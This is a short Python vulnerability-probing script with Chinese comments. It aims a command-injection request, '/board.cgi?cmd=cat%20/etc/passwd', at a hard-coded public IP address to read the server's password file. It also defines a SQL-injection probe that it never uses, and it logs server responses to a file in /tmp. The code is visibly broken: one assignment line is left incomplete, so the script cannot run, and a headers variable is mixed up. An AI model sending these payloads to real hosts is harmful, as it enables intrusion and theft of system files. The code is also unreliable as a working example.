# !/usr/bin/env python
# -*- coding:utf-8 -*-


import requests


def check_vul(**data):
    #' replace %27, " replace %22
    file = open('/tmp/http_content.txt', 'a')
    useragent = ''
    if 'url' in data.keys() and 'hostname' in data.keys():
        data['url'] =
        # 判断url里面是否包含'或者",如果包含需要进行编码转换
        httpurl = 'http://'+data['hostname'] + data['url']
        httpsurl = 'https://'+data['hostname'] + data['url']
    else:
        return 'no hostname or url'
    if 'method' in data.keys():
        if data['method'].lower() == 'get':
            # get 方式进行验证
            r_http = requests.get(httpurl, headers = headers, timeout = 5)
            r_https = requests.get(httpsurl, headers = headers, timeout = 5, verify = False)
            if r_http.status_code == 200:
                file.write('-'*30)
                file.write('\n')
                file.write(str(httpurl) + '\n')
                file.write(str(r_http.content) + '\n')
            else:
                file.write('-' * 30)
                file.write('\n')
                file.write(str(r_http) + 'cannot open !\n')
            if r_https.status_code == 200:
                file.write('-' * 30)
                file.write('\n')
                file.write(str(httpsurl) + '\n')
                file.write(str(r_https.content) + '\n')
            else:
                file.write('-' * 30)
                file.write('\n')
                file.write(str(r_https) + 'cannot open !\n')



if __name__ == '__main__':
    header = headers = {'user-agent': 'my-app/0.0.1'}
    url = '/board.cgi?cmd=cat%20/etc/passwd'
    url1 = "/test/id=1'"
    hostname = '114.113.67.49'
    port = ''
    postdata = ''
    method = 'GET'
    check_vul(url = url, hostname = hostname, port = port, postdata = postdata, header = header, method = method )